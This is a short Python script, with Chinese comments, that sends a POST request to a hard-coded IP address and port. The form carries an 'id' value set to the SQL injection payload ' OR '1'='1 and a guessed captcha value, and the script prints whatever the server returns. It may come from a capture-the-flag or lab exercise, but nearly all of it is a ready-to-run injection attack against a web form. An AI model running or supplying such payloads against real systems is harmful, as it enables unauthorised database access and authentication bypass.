import requests

# URL of the form action
url = "http://124.16.75.117:51003/"  # 替换为实际的URL

# SQL injection payload
payload = "' OR '1'='1"

# Data to be sent in the form
data = {"authcode": "y8v5", "id": payload}  # 假设验证码可以是任意值

# Send a POST request with the form data
response = requests.post(url, data=data)

# Check if the request was successful
if response.status_code == 200:
    # Print the response content
    print(response.text)
else:
    print(f"Error: {response.status_code}")
